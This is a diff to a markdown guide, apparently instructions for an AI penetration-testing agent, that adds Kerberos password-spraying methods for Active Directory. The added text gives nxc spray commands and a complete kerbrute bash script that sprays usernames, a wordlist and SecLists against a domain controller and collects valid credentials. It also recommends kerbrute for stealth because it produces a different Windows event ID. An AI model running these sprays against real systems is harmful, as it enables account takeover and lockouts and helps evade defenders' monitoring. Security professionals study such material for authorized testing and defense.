@@ -415,7 +415,8 @@ passwords).
 ### Service Protocol Commands
 
 Use `nxc` (netexec) for all supported protocols. Only fall back to `hydra`
-for protocols netexec does not support.
+for protocols netexec does not support, or `kerbrute` for Kerberos-only
+environments (see NTLM-Disabled Environments below).
 
 ```bash
 # SMB (most common)
@@ -456,6 +457,34 @@ skipped. Without it, nxc tests all combinations (every password against every
 user), which is what spray mode requires. Use lockout-aware pacing (below)
 to stay safe.
 
+### NTLM-Disabled Environments
+
+When NTLM is disabled (STATUS_NOT_SUPPORTED on SMB/LDAP auth), the default
+nxc spray script will fail. Two options:
+
+**Option A — nxc with Kerberos (preferred, simpler):**
+
+Add `--kerberos` to all nxc commands in the spray script. nxc handles
+Kerberos authentication natively — no script restructuring needed:
+
+```bash
+nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN --kerberos
+nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success --kerberos
+```
+
+This is a drop-in flag — the spray script template works as-is with this
+addition. Use this approach when the operator selected nxc-compatible
+services (SMB, LDAP, WinRM).
+
+**Option B — kerbrute loop (Kerberos pre-auth, stealthier):**
+
+Use the kerbrute spray script variant (see below). Generates Event 4771
+instead of 4625. Use when OPSEC matters or when nxc Kerberos auth fails.
+
+**Detection:** If the orchestrator context mentions NTLM disabled, Kerberos-
+only, or STATUS_NOT_SUPPORTED, you MUST use one of these approaches. Do not
+attempt standard nxc commands without `--kerberos` — they will silently fail.
+
 ## Lockout-Aware Spray Pacing
 
 If the lockout policy has a non-zero threshold, pace the spray to avoid
@@ -490,10 +519,107 @@ engagements where OPSEC is not a concern, netexec is simpler and preferred.
 
 ### kerbrute (Kerberos Pre-Auth)
 
+**CRITICAL: `kerbrute passwordspray` takes a SINGLE password string, NOT a
+wordlist file.** Passing a file path as the password argument will literally
+test the file path string as the password (e.g., trying the password
+`/home/user/wordlist.txt` against all users). This is silent, wrong, and
+wastes the entire spray.
+
+Single password usage:
 ```bash
 kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
-  users.txt 'Spring2026!' -v -o spray-round1.log
+  users.txt 'Spring2026!' -v
 ```
+
+**To spray a wordlist with kerbrute, loop through it:**
+
+```bash
+while IFS= read -r pass || [[ -n "$pass" ]]; do
+    [[ -z "$pass" || "$pass" == \#* ]] && continue
+    kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
+      users.txt "$pass" 2>&1 | tee -a spray-results.txt
+done < wordlist.txt
+```
+
+#### Kerbrute Spray Script Variant
+
+When using kerbrute instead of nxc (NTLM-disabled environments or OPSEC-
+sensitive engagements), generate this spray script variant:
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+# === Configuration (agent fills these from orchestrator context) ===
+TARGET_DC="DC01.DOMAIN.LOCAL"
+DOMAIN="DOMAIN.LOCAL"
+USERFILE="engagement/evidence/usernames.txt"
+WORDLIST="engagement/evidence/wordlist.txt"
+RESULTS="engagement/evidence/spray-results.txt"
+SECLISTS_FILE="SECLISTS_PATH"
+
+# === Helper: spray one password against all users ===
+spray_one() {
+    local pass="$1"
+    kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET_DC" \
+      "$USERFILE" "$pass" 2>&1
+}
+
+# === Spray Execution ===
+> "$RESULTS"
+
+echo "========================================" | tee -a "$RESULTS"
+echo "[*] Kerbrute spray — $(wc -l < "$USERFILE") users" | tee -a "$RESULTS"
+echo "========================================" | tee -a "$RESULTS"
+
+# Round 1: Username-as-password
+echo "[*] Round 1: username-as-password" | tee -a "$RESULTS"
+while IFS= read -r user || [[ -n "$user" ]]; do
+    [[ -z "$user" ]] && continue
+    spray_one "$user" | tee -a "$RESULTS"
+done < "$USERFILE"
+echo "" | tee -a "$RESULTS"
+
+# Round 2: Context wordlist
+echo "[*] Round 2: context wordlist ($(wc -l < "$WORDLIST") passwords)" | tee -a "$RESULTS"
+while IFS= read -r pass || [[ -n "$pass" ]]; do
+    [[ -z "$pass" || "$pass" == \#* ]] && continue
+    spray_one "$pass" | tee -a "$RESULTS"
+done < "$WORDLIST"
+echo "" | tee -a "$RESULTS"
+
+# Round 3: SecLists wordlist
+if [[ -f "$SECLISTS_FILE" ]]; then
+    total=$(wc -l < "$SECLISTS_FILE")
+    echo "[*] Round 3: SecLists ($total passwords)" | tee -a "$RESULTS"
+    count=0
+    while IFS= read -r pass || [[ -n "$pass" ]]; do
+        [[ -z "$pass" || "$pass" == \#* ]] && continue
+        spray_one "$pass" | tee -a "$RESULTS"
+        count=$((count + 1))
+        if (( count % 100 == 0 )); then
+            echo "[*] Progress: $count / $total" | tee -a "$RESULTS"
+        fi
+    done < "$SECLISTS_FILE"
+    echo "" | tee -a "$RESULTS"
+else
+    echo "[!] SecLists file not found: $SECLISTS_FILE" | tee -a "$RESULTS"
+fi
+
+echo "========================================" | tee -a "$RESULTS"
+echo "[*] Spray complete" | tee -a "$RESULTS"
+echo "" | tee -a "$RESULTS"
+echo "=== VALID CREDENTIALS ===" | tee -a "$RESULTS"
+grep -i 'valid pass' "$RESULTS" 2>/dev/null || echo "(none found)" | tee -a "$RESULTS"
+```
+
+**When to use this variant instead of the nxc script:**
+- NTLM disabled and `nxc --kerberos` fails or is unavailable
+- OPSEC-sensitive engagement (generates 4771 instead of 4625)
+- Operator explicitly requests kerbrute
+
+**Execute the same way** — write via Write tool, `chmod +x`, run via
+`start_process`.
 
 ### Hash Spray (Lateral Movement)
 
